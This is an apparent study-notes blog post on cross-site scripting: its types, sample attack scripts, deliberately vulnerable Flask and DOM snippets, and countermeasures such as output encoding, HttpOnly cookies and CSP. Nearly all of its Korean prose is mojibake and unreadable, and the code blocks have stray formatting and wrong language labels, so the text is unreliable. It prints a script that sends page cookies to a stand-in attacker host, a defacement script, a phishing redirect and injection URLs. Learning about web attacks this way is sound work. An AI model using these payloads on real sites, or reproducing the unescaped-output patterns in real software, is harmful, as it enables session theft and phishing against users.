---
title: "[2025-07-10] XSS"
excerpt: "XSS ê°œë… ì •ë¦¬"

categories:
  - Justice
tags:
  - [XSS]

permalink: /Justice/[2025-07-10] XSS/

toc: true
toc_sticky: true

date: 2025-07-10
last_modified_at: 2025-07-10
---

## ğŸ¦¥ ë³¸ë¬¸

### ì •ì˜

Cross-Site Scripting. ì›¹ í˜ì´ì§€ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•´ì„œ, ì˜ë„í•˜ì§€ ì•Šì€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ì›¹ í•´í‚¹ ê¸°ë²•

### ì•…ì„± ìŠ¤í¬ë¦½íŠ¸

ì¿ í‚¤ ë° ì„¸ì…˜ íƒˆì·¨ ê³µê²© ì½”ë“œ 

```jsx
<script>
// "hello" ë¬¸ìì—´ alert ì‹¤í–‰.
alert("hello");
// í˜„ì¬ í˜ì´ì§€ì˜ ì¿ í‚¤(return type: string)
document.cookie; 
// í˜„ì¬ í˜ì´ì§€ì˜ ì¿ í‚¤ë¥¼ ì¸ìë¡œ ê°€ì§„ alert ì‹¤í–‰.
alert(document.cookie);
// ì¿ í‚¤ ìƒì„±(key: name, value: test)
document.cookie = "name=test;";
// new Image() ëŠ” ì´ë¯¸ì§€ë¥¼ ìƒì„±í•˜ëŠ” í•¨ìˆ˜ì´ë©°, srcëŠ” ì´ë¯¸ì§€ì˜ ì£¼ì†Œë¥¼ ì§€ì •. ê³µê²©ì ì£¼ì†ŒëŠ” http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=í˜„ì¬í˜ì´ì§€ì˜ì¿ í‚¤" ì£¼ì†Œë¥¼ ìš”ì²­í•˜ê¸° ë•Œë¬¸ì— ê³µê²©ì ì£¼ì†Œë¡œ í˜„ì¬ í˜ì´ì§€ì˜ ì¿ í‚¤ ìš”ì²­í•¨
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

í˜ì´ì§€ ë³€ì¡° ì½”ë“œ

```jsx
<script>
// ì´ìš©ìì˜ í˜ì´ì§€ ì •ë³´ì— ì ‘ê·¼.
document;
// ì´ìš©ìì˜ í˜ì´ì§€ì— ë°ì´í„°ë¥¼ ì‚½ì….
document.write("Hacked By DreamHack !");
</script>
```

ìœ„ì¹˜ ì´ë™ ê³µê²© ì½”ë“œ

```jsx
<script>
// ì´ìš©ìì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½.
// í”¼ì‹± ê³µê²© ë“±ìœ¼ë¡œ ì‚¬ìš©ë¨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// ìƒˆ ì°½ ì—´ê¸°
window.open("http://hacker.dreamhack.io/")
</script>
```

### Reflected XSS

ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ URL, form ë“±ì— ì‚½ì…í•˜ì—¬ ë°±ì—”ë“œì—ì„œ í•´ì„í•˜ê³  ì²˜ë¦¬ë˜ì–´ í˜ì´ì§€ì— ë°˜ì˜í•˜ëŠ” í˜•íƒœ. ê³µê²©ìì˜ ì…ë ¥ì´ ì¦‰ì‹œ í˜ì´ì§€ ì‘ë‹µì— ë°˜ì˜í•œë‹¤. 

ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨ëœ ë§í¬ì— ì ‘ì†í•˜ë„ë¡ ìœ ë„í•´ì•¼ í•˜ëŠ” ë° ì§ì ‘ ë§í¬ë¥¼ ì „ë‹¬í•˜ëŠ” ë°©ë²•ë³´ë‹¤ëŠ” Click Jacking ë˜ëŠ” Open Redirect ë°©ë²•ê³¼ ì—°ê³„í•˜ì—¬ ì‚¬ìš©í•œë‹¤ 

```python
**from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    # http://localhost:5000/?name=<script>alert('XSS');</script>
    name = request.args.get('name', 'World')
    return f"<h1>Hello {name}!</h1>"  # not enough filtering : XSS possible

if __name__ == '__main__':
    app.run(debug=True)**
```

ìœ„ì™€ ê°™ì€ ê²½ìš° GET ë°©ì‹ìœ¼ë¡œ nameì„ ë°›ì•„ì„œ ì‹¤í–‰í•˜ëŠ” ë°, name ë¶€ë¶„ì„ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë„£ì–´ì„œ ë³´ë‚´ ê³µê²©ìê°€ ì›í•˜ëŠ” JS codeë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆë‹¤. 

### Stored XSS

ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì„œë²„ì— ì €ì¥í•˜ê²Œ í•˜ì—¬ ì´í›„ í•´ë‹¹ ë°ì´í„°ë¥¼ ì¡°íšŒí•˜ëŠ” ë‹¤ë¥¸ì‚¬ìš©ìì—ê²Œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ê²Œ í•˜ëŠ” ë°©ì‹. ë‹¤ë¥¸ ì‚¬ìš©ìì—ê²Œ ìë™ ì „íŒŒê°€ ê°€ëŠ¥í•˜ì—¬ ê°€ì¥ ìœ„í—˜í•œ XSS ì¤‘ í•˜ë‚˜ì´ë‹¤. 

```python
@app.route('/submit', methods=['GET', 'POST'])
def submit():
    if request.method == 'POST':
        msg = request.form.get('message', '')
        conn = get_db()
        conn.execute("INSERT INTO messages (content) VALUES (?)", (msg,))
        conn.commit()
        conn.close()
        return redirect('/messages')
    
    return '''
        <form method="post">
            <input type="text" name="message">
            <input type="submit">
        </form>
    '''

@app.route('/messages')
def messages():
    conn = get_db()
    msgs = conn.execute("SELECT content FROM messages").fetchall()
    conn.close()
    output = "<h1>Messages</h1>"
    for m in msgs:
        output += f"<p>{m['content']}</p>"
    return output

if __name__ == '__main__':
    app.run(debug=True)

```

/submit APIë¥¼ í†µí•´ messageë¥¼ ë°›ê²Œ ëœë‹¤. ì´ ë•Œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë³´ë‚´ì–´ DBì— ì €ì¥í•˜ê²Œ í•œë‹¤.

/message APIì—ì„œ ë©”ì‹œì§€ ê°’ë“¤ì„ ë³´ì—¬ì¤„ ë•Œ, ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ê°™ì´ ì‹¤í–‰ëœë‹¤.  

### DOM-based XSS

ë¸Œë¼ìš°ì €ì˜ JS codeê°€ ì§ì ‘ DOMì— ë°˜ì˜í•˜ë©´ì„œ ë°œìƒí•˜ëŠ” XSSì´ë‹¤. ì„œë²„ê°€ ì•„ë‹Œ í´ë¼ì´íŠ¸ ì¸¡ì—ì„œ ë°œìƒí•œë‹¤. 

```python
// í•´ì‹œë¥¼ ì½ì–´ì„œ í˜ì´ì§€ì— ì¶œë ¥
const comment = location.hash.slice(1);
document.getElementById("output").innerHTML = comment;

https://example.com/#<script>alert(1)</script>
```

í•´ì‹œë¥¼ ì½ì–´ì„œ í˜ì´ì§€ì— ì¶œë ¥í•˜ëŠ” ì½”ë“œì—ì„œ ì•„ë˜ì™€ ê°™ì€ URLì„ ì…ë ¥í•˜ë©´ ì˜ë„í•˜ì§€ ì•ŠëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ëœë‹¤.

### Universal XSS (UXSS)

ë¸Œë¼ìš°ì €ì˜ ì·¨ì•½ì ì„ ì´ìš©í•´ ë°œìƒí•˜ëŠ” XSS ê³µê²©. SOPë¥¼ ë¬´ì‹œí•˜ê³  ë‹¤ë¥¸ ë„ë©”ì¸ì˜ ì¿ í‚¤, ì„¸ì…˜, ë¡œì»¬ ìŠ¤í† ë¦¬ì§€ì— ì ‘ê·¼ í•˜ëŠ” ê³µê²© 

### ëŒ€ì‘ ë°©ì•ˆ

1. ì…ë ¥ê°’ ê²€ì¦ ë° í•„í„°ë§
    
    â†’ íŠ¹ìˆ˜ ê¸°í˜¸ë‚˜ â€œScriptâ€ ë“±ì˜ ìœ„í—˜í•œ ë¬¸ìì—´ ê²€ì—´
    
2. ì¶œë ¥ ì‹œ ì¸ì½”ë”©
    
    â†’ ë¸Œë¼ìš°ì €ì— ì¶œë ¥ë˜ê¸° ì „ URL encoding, HTML encodingìœ¼ë¡œ XSSë¥¼ ë°©ì§€
    
3. ë¼ì´ë¸ŒëŸ¬ë¦¬/API ë‚´ë¶€ ë³´í˜¸ê¸°ì‘ : Flask, node.js
    
    â†’ ex) Flaskì˜ render_template() í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ë¦¬ì†ŒìŠ¤ë¥¼ ë„ìš°ë©´ ë‚´ë¶€ ë¡œì§ì—ì„œ XSS í•„í„°ë§ì´ ë™ì‘
    
4. Set HttpOnly flag on Cookies
    
    â†’ CookieëŠ” Client ì¸¡ Script ë“±ì—ì„œ ì ‘ê·¼ ë¶ˆê°€. ë°±ì—”ë“œì—ì„œ ì½ê³  ì¤„ ìˆ˜ ìˆìŒ
    
5. CSP : â€œsrcâ€ attribute ë“±ì— Get ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒì„ í—ˆìš©í•˜ëŠ” ê·œì¹™ì„ ì„¸ìš¸ ìˆ˜ ìˆìŒ. HTMLì˜ meta íƒœê·¸ì—ì„œ í™•ì¸/ì„¤ì • ê°€ëŠ¥. HTTP Headerì—ì„œë„ ë³¼ ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ í† í•´ ë¸Œë¼ìš°ì €ëŠ” Get ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆëŠ” ì„œë²„ë¥¼ ì œí•œ